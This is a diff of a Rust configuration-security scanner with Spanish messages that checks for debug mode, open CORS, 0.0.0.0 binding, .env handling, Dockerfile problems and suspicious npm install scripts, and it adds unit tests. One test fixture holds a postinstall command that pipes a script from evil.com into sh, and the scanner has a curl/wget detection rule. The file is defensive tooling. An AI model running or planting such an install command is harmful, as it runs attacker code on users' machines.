@@ -23,7 +23,11 @@ pub fn scan_insecure_configs(project_path: &Path) -> Vec<SecurityFinding> {
                 continue;
             }
             let name = entry.file_name().to_string_lossy().to_string();
-            if name.starts_with('.') || name == "node_modules" || name == "target" || name == "__pycache__" {
+            if name.starts_with('.')
+                || name == "node_modules"
+                || name == "target"
+                || name == "__pycache__"
+            {
                 continue;
             }
             scan_debug_mode(&sub, &mut findings);
@@ -57,7 +61,10 @@ fn scan_debug_mode(dir: &Path, findings: &mut Vec<SecurityFinding>) {
         if let Some(content) = read_file_if_exists(&path) {
             for (i, line) in content.lines().enumerate() {
                 let trimmed = line.trim();
-                if trimmed.starts_with("DEBUG") && trimmed.contains("True") && !trimmed.starts_with('#') {
+                if trimmed.starts_with("DEBUG")
+                    && trimmed.contains("True")
+                    && !trimmed.starts_with('#')
+                {
                     findings.push(SecurityFinding {
                         id: format!("debug-django-{}", findings.len()),
                         severity: Severity::High,
@@ -66,7 +73,8 @@ fn scan_debug_mode(dir: &Path, findings: &mut Vec<SecurityFinding>) {
                         description: format!("DEBUG está habilitado en {}", name),
                         file_path: Some(format!("{}/{}", dir_label, name)),
                         line_number: Some((i + 1) as u32),
-                        remediation: "Usar DEBUG = os.environ.get('DEBUG', 'False') == 'True'".into(),
+                        remediation: "Usar DEBUG = os.environ.get('DEBUG', 'False') == 'True'"
+                            .into(),
                     });
                 }
             }
@@ -96,30 +104,26 @@ fn scan_debug_mode(dir: &Path, findings: &mut Vec<SecurityFinding>) {
 
     // Node/Express: NODE_ENV not set to production check
     let pkg_path = dir.join("package.json");
-    if let Some(content) = read_file_if_exists(&pkg_path) {
-        if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
-            if let Some(scripts) = json.get("scripts").and_then(|s| s.as_object()) {
-                if let Some(start) = scripts.get("start").and_then(|s| s.as_str()) {
-                    if !start.contains("NODE_ENV=production")
-                        && !start.contains("cross-env NODE_ENV")
-                        && start.contains("node ")
-                    {
-                        // Only warn if it's a server (not a build script)
-                        if start.contains("server") || start.contains("app") || start.contains("index") {
-                            findings.push(SecurityFinding {
-                                id: format!("node-env-{}", findings.len()),
-                                severity: Severity::Low,
-                                category: FindingCategory::DebugEnabled,
-                                title: "NODE_ENV no definido en start script".into(),
-                                description: "El script 'start' no establece NODE_ENV=production".into(),
-                                file_path: Some(format!("{}/package.json", dir_label)),
-                                line_number: None,
-                                remediation: "Agregar NODE_ENV=production al start script o usar cross-env".into(),
-                            });
-                        }
-                    }
-                }
-            }
+    if let Some(content) = read_file_if_exists(&pkg_path)
+        && let Ok(json) = serde_json::from_str::<serde_json::Value>(&content)
+        && let Some(scripts) = json.get("scripts").and_then(|s| s.as_object())
+        && let Some(start) = scripts.get("start").and_then(|s| s.as_str())
+        && !start.contains("NODE_ENV=production")
+        && !start.contains("cross-env NODE_ENV")
+        && start.contains("node ")
+    {
+        // Only warn if it's a server (not a build script)
+        if start.contains("server") || start.contains("app") || start.contains("index") {
+            findings.push(SecurityFinding {
+                id: format!("node-env-{}", findings.len()),
+                severity: Severity::Low,
+                category: FindingCategory::DebugEnabled,
+                title: "NODE_ENV no definido en start script".into(),
+                description: "El script 'start' no establece NODE_ENV=production".into(),
+                file_path: Some(format!("{}/package.json", dir_label)),
+                line_number: None,
+                remediation: "Agregar NODE_ENV=production al start script o usar cross-env".into(),
+            });
         }
     }
 }
@@ -136,7 +140,9 @@ fn scan_cors_config(dir: &Path, findings: &mut Vec<SecurityFinding>) {
                 let trimmed = line.trim();
                 if (trimmed.contains("CORS_ALLOW_ALL_ORIGINS") && trimmed.contains("True"))
                     || (trimmed.contains("allow_origins") && trimmed.contains("\"*\""))
-                    || (trimmed.contains("origins") && trimmed.contains("\"*\"") && trimmed.contains("cors"))
+                    || (trimmed.contains("origins")
+                        && trimmed.contains("\"*\"")
+                        && trimmed.contains("cors"))
                 {
                     findings.push(SecurityFinding {
                         id: format!("cors-open-{}", findings.len()),
@@ -154,7 +160,14 @@ fn scan_cors_config(dir: &Path, findings: &mut Vec<SecurityFinding>) {
     }
 
     // JS/TS: cors({ origin: '*' }) or cors() without config
-    let js_files = ["server.js", "server.ts", "app.js", "app.ts", "index.js", "index.ts"];
+    let js_files = [
+        "server.js",
+        "server.ts",
+        "app.js",
+        "app.ts",
+        "index.js",
+        "index.ts",
+    ];
     for name in &js_files {
         let path = dir.join(name);
         if let Some(content) = read_file_if_exists(&path) {
@@ -171,7 +184,8 @@ fn scan_cors_config(dir: &Path, findings: &mut Vec<SecurityFinding>) {
                         description: format!("CORS abierto detectado en {}", name),
                         file_path: Some(format!("{}/{}", dir_label, name)),
                         line_number: Some((i + 1) as u32),
-                        remediation: "Configurar cors({ origin: ['https://tudominio.com'] })".into(),
+                        remediation: "Configurar cors({ origin: ['https://tudominio.com'] })"
+                            .into(),
                     });
                 }
             }
@@ -184,23 +198,36 @@ fn scan_exposed_ports(dir: &Path, findings: &mut Vec<SecurityFinding>) {
 
     // Check for 0.0.0.0 binding without awareness
     let files_to_check = [
-        "main.py", "app.py", "server.py", "manage.py",
-        "server.js", "server.ts", "app.js", "app.ts",
-        "main.go", "main.rs",
+        "main.py",
+        "app.py",
+        "server.py",
+        "manage.py",
+        "server.js",
+        "server.ts",
+        "app.js",
+        "app.ts",
+        "main.go",
+        "main.rs",
     ];
 
     for name in &files_to_check {
         let path = dir.join(name);
         if let Some(content) = read_file_if_exists(&path) {
             for (i, line) in content.lines().enumerate() {
-                if line.contains("0.0.0.0") && !line.trim().starts_with("//") && !line.trim().starts_with('#') {
+                if line.contains("0.0.0.0")
+                    && !line.trim().starts_with("//")
+                    && !line.trim().starts_with('#')
+                {
                     // Binding to all interfaces — warning only
                     findings.push(SecurityFinding {
                         id: format!("bind-all-{}", findings.len()),
                         severity: Severity::Low,
                         category: FindingCategory::InsecureConfig,
                         title: "Binding a 0.0.0.0".into(),
-                        description: format!("El servidor se enlaza a todas las interfaces en {}", name),
+                        description: format!(
+                            "El servidor se enlaza a todas las interfaces en {}",
+                            name
+                        ),
                         file_path: Some(format!("{}/{}", dir_label, name)),
                         line_number: Some((i + 1) as u32),
                         remediation: "En producción, usar 127.0.0.1 o configurar firewall".into(),
@@ -215,13 +242,18 @@ fn scan_missing_env_example(dir: &Path, findings: &mut Vec<SecurityFinding>) {
     let dir_label = dir.to_string_lossy().to_string();
 
     // .env exists but no .env.example
-    if dir.join(".env").exists() && !dir.join(".env.example").exists() && !dir.join(".env.sample").exists() {
+    if dir.join(".env").exists()
+        && !dir.join(".env.example").exists()
+        && !dir.join(".env.sample").exists()
+    {
         findings.push(SecurityFinding {
             id: format!("env-no-example-{}", findings.len()),
             severity: Severity::Low,
             category: FindingCategory::InsecureConfig,
             title: "Falta .env.example".into(),
-            description: "Existe .env pero no hay .env.example para documentar las variables necesarias".into(),
+            description:
+                "Existe .env pero no hay .env.example para documentar las variables necesarias"
+                    .into(),
             file_path: Some(format!("{}/.env", dir_label)),
             line_number: None,
             remediation: "Crear .env.example con nombres de variables (sin valores reales)".into(),
@@ -242,7 +274,8 @@ fn scan_missing_env_example(dir: &Path, findings: &mut Vec<SecurityFinding>) {
                     severity: Severity::High,
                     category: FindingCategory::InsecureConfig,
                     title: ".env no está en .gitignore".into(),
-                    description: "El archivo .env podría ser commiteado al repositorio con secretos".into(),
+                    description:
+                        "El archivo .env podría ser commiteado al repositorio con secretos".into(),
                     file_path: Some(format!("{}/.gitignore", dir_label)),
                     line_number: None,
                     remediation: "Agregar .env a .gitignore inmediatamente".into(),
@@ -295,29 +328,33 @@ fn scan_dockerfile_issues(dir: &Path, findings: &mut Vec<SecurityFinding>) {
                     description: "Usar :latest puede resultar en builds no reproducibles".into(),
                     file_path: Some(format!("{}/Dockerfile", dir_label)),
                     line_number: Some((i + 1) as u32),
-                    remediation: "Fijar versión específica (ej: python:3.11-slim, node:20-alpine)".into(),
+                    remediation: "Fijar versión específica (ej: python:3.11-slim, node:20-alpine)"
+                        .into(),
                 });
             }
 
             // COPY . . without .dockerignore
-            if trimmed.starts_with("COPY . .") || trimmed.starts_with("ADD . .") {
-                if !dir.join(".dockerignore").exists() {
-                    findings.push(SecurityFinding {
-                        id: format!("docker-copy-all-{}", findings.len()),
-                        severity: Severity::Medium,
-                        category: FindingCategory::InsecureConfig,
-                        title: "COPY . . sin .dockerignore".into(),
-                        description: "Copiar todo el contexto puede incluir .env, .git, node_modules".into(),
-                        file_path: Some(format!("{}/Dockerfile", dir_label)),
-                        line_number: Some((i + 1) as u32),
-                        remediation: "Crear .dockerignore con .env, .git, node_modules, target".into(),
-                    });
-                }
+            if (trimmed.starts_with("COPY . .") || trimmed.starts_with("ADD . ."))
+                && !dir.join(".dockerignore").exists()
+            {
+                findings.push(SecurityFinding {
+                    id: format!("docker-copy-all-{}", findings.len()),
+                    severity: Severity::Medium,
+                    category: FindingCategory::InsecureConfig,
+                    title: "COPY . . sin .dockerignore".into(),
+                    description: "Copiar todo el contexto puede incluir .env, .git, node_modules"
+                        .into(),
+                    file_path: Some(format!("{}/Dockerfile", dir_label)),
+                    line_number: Some((i + 1) as u32),
+                    remediation: "Crear .dockerignore con .env, .git, node_modules, target".into(),
+                });
             }
         }
 
         // Check if Dockerfile has no USER instruction (runs as root by default)
-        let has_user = content.lines().any(|l| l.trim().to_uppercase().starts_with("USER "));
+        let has_user = content
+            .lines()
+            .any(|l| l.trim().to_uppercase().starts_with("USER "));
         if !has_user {
             findings.push(SecurityFinding {
                 id: format!("docker-no-user-{}", findings.len()),
@@ -337,27 +374,256 @@ fn scan_package_json_scripts(dir: &Path, findings: &mut Vec<SecurityFinding>) {
     let dir_label = dir.to_string_lossy().to_string();
     let pkg = dir.join("package.json");
 
-    if let Some(content) = read_file_if_exists(&pkg) {
-        if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
-            // Check for pre/post install scripts (supply chain risk)
-            if let Some(scripts) = json.get("scripts").and_then(|s| s.as_object()) {
-                for key in ["preinstall", "postinstall"] {
-                    if let Some(cmd) = scripts.get(key).and_then(|s| s.as_str()) {
-                        if cmd.contains("curl") || cmd.contains("wget") || cmd.contains("http") {
-                            findings.push(SecurityFinding {
-                                id: format!("npm-{}-{}", key, findings.len()),
-                                severity: Severity::High,
-                                category: FindingCategory::InsecureConfig,
-                                title: format!("Script {} sospechoso", key),
-                                description: format!("El script {} descarga desde internet: {}", key, cmd),
-                                file_path: Some(format!("{}/package.json", dir_label)),
-                                line_number: None,
-                                remediation: "Revisar el script y asegurar que las fuentes son confiables".into(),
-                            });
-                        }
-                    }
+    if let Some(content) = read_file_if_exists(&pkg)
+        && let Ok(json) = serde_json::from_str::<serde_json::Value>(&content)
+    {
+        // Check for pre/post install scripts (supply chain risk)
+        if let Some(scripts) = json.get("scripts").and_then(|s| s.as_object()) {
+            for key in ["preinstall", "postinstall"] {
+                if let Some(cmd) = scripts.get(key).and_then(|s| s.as_str())
+                    && (cmd.contains("curl") || cmd.contains("wget") || cmd.contains("http"))
+                {
+                    findings.push(SecurityFinding {
+                        id: format!("npm-{}-{}", key, findings.len()),
+                        severity: Severity::High,
+                        category: FindingCategory::InsecureConfig,
+                        title: format!("Script {} sospechoso", key),
+                        description: format!("El script {} descarga desde internet: {}", key, cmd),
+                        file_path: Some(format!("{}/package.json", dir_label)),
+                        line_number: None,
+                        remediation: "Revisar el script y asegurar que las fuentes son confiables"
+                            .into(),
+                    });
                 }
             }
         }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::fs;
+    use tempfile::TempDir;
+
+    fn setup_project(files: &[(&str, &str)]) -> TempDir {
+        let dir = TempDir::new().unwrap();
+        for (name, content) in files {
+            let path = dir.path().join(name);
+            if let Some(parent) = path.parent() {
+                fs::create_dir_all(parent).unwrap();
+            }
+            fs::write(&path, content).unwrap();
+        }
+        dir
+    }
+
+    // --- Debug mode tests ---
+
+    #[test]
+    fn test_django_debug_true() {
+        let dir = setup_project(&[("settings.py", "DEBUG = True\nALLOWED_HOSTS = ['*']")]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains("Django DEBUG")));
+    }
+
+    #[test]
+    fn test_django_debug_false_no_finding() {
+        let dir = setup_project(&[("settings.py", "DEBUG = False")]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(!findings.iter().any(|f| f.title.contains("Django DEBUG")));
+    }
+
+    #[test]
+    fn test_flask_debug_true() {
+        let dir = setup_project(&[("app.py", "app.run(host='0.0.0.0', debug=True)")]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains("Flask debug")));
+    }
+
+    #[test]
+    fn test_node_env_missing_in_start_script() {
+        let dir = setup_project(&[("package.json", r#"{"scripts":{"start":"node server.js"}}"#)]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains("NODE_ENV")));
+    }
+
+    #[test]
+    fn test_node_env_present_no_finding() {
+        let dir = setup_project(&[(
+            "package.json",
+            r#"{"scripts":{"start":"NODE_ENV=production node server.js"}}"#,
+        )]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(!findings.iter().any(|f| f.title.contains("NODE_ENV")));
+    }
+
+    // --- CORS tests ---
+
+    #[test]
+    fn test_cors_wildcard_python() {
+        let dir = setup_project(&[("settings.py", "CORS_ALLOW_ALL_ORIGINS = True")]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains("CORS")));
+    }
+
+    #[test]
+    fn test_cors_wildcard_js() {
+        let dir = setup_project(&[("server.js", "app.use(cors())")]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains("CORS")));
+    }
+
+    // --- Exposed ports ---
+
+    #[test]
+    fn test_binding_all_interfaces() {
+        let dir = setup_project(&[("main.py", "app.run(host='0.0.0.0', port=8000)")]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains("0.0.0.0")));
+    }
+
+    // --- .env tests ---
+
+    #[test]
+    fn test_env_without_example() {
+        let dir = setup_project(&[(".env", "SECRET=value")]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.title.contains(".env.example") || f.title.contains(".gitignore"))
+        );
+    }
+
+    #[test]
+    fn test_env_with_example_no_finding() {
+        let dir = setup_project(&[
+            (".env", "SECRET=value"),
+            (".env.example", "SECRET="),
+            (".gitignore", ".env"),
+        ]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(!findings.iter().any(|f| f.title.contains(".env.example")));
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.title.contains("no está en .gitignore"))
+        );
+    }
+
+    #[test]
+    fn test_env_not_in_gitignore() {
+        let dir = setup_project(&[
+            (".env", "SECRET=value"),
+            (".env.example", "SECRET="),
+            (".gitignore", "node_modules\ntarget"),
+        ]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains(".gitignore")));
+    }
+
+    // --- Dockerfile tests ---
+
+    #[test]
+    fn test_dockerfile_user_root() {
+        let dir = setup_project(&[(
+            "Dockerfile",
+            "FROM python:3.11\nUSER root\nCOPY . .\nCMD [\"python\", \"app.py\"]",
+        )]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains("root")));
+    }
+
+    #[test]
+    fn test_dockerfile_latest_tag() {
+        let dir = setup_project(&[(
+            "Dockerfile",
+            "FROM python:latest\nUSER appuser\nCMD [\"python\"]",
+        )]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains(":latest")));
+    }
+
+    #[test]
+    fn test_dockerfile_copy_all_no_dockerignore() {
+        let dir = setup_project(&[(
+            "Dockerfile",
+            "FROM node:20\nCOPY . .\nUSER node\nCMD [\"node\", \"app.js\"]",
+        )]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains("COPY . .")));
+    }
+
+    #[test]
+    fn test_dockerfile_no_user_instruction() {
+        let dir = setup_project(&[
+            (
+                "Dockerfile",
+                "FROM python:3.11\nCOPY requirements.txt .\nRUN pip install -r requirements.txt\nCOPY . .\nCMD [\"python\", \"app.py\"]",
+            ),
+            (".dockerignore", ".env\n.git"),
+        ]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.title.contains("sin instrucción USER"))
+        );
+    }
+
+    #[test]
+    fn test_dockerfile_with_user_no_finding() {
+        let dir = setup_project(&[
+            (
+                "Dockerfile",
+                "FROM python:3.11\nRUN adduser appuser\nCOPY requirements.txt .\nUSER appuser\nCMD [\"python\"]",
+            ),
+            (".dockerignore", ".env"),
+        ]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.title.contains("sin instrucción USER"))
+        );
+    }
+
+    // --- package.json supply chain ---
+
+    #[test]
+    fn test_suspicious_postinstall_script() {
+        let dir = setup_project(&[(
+            "package.json",
+            r#"{"scripts":{"postinstall":"curl https://evil.com/script.sh | sh"}}"#,
+        )]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains("postinstall")));
+    }
+
+    #[test]
+    fn test_safe_postinstall_no_finding() {
+        let dir = setup_project(&[(
+            "package.json",
+            r#"{"scripts":{"postinstall":"node scripts/setup.js"}}"#,
+        )]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(!findings.iter().any(|f| f.title.contains("postinstall")));
+    }
+
+    // --- Subdirectory scanning ---
+
+    #[test]
+    fn test_scans_subdirectories() {
+        let dir = setup_project(&[("backend/settings.py", "DEBUG = True")]);
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.iter().any(|f| f.title.contains("Django DEBUG")));
+    }
+
+    #[test]
+    fn test_empty_project() {
+        let dir = TempDir::new().unwrap();
+        let findings = scan_insecure_configs(dir.path());
+        assert!(findings.is_empty());
     }
 }
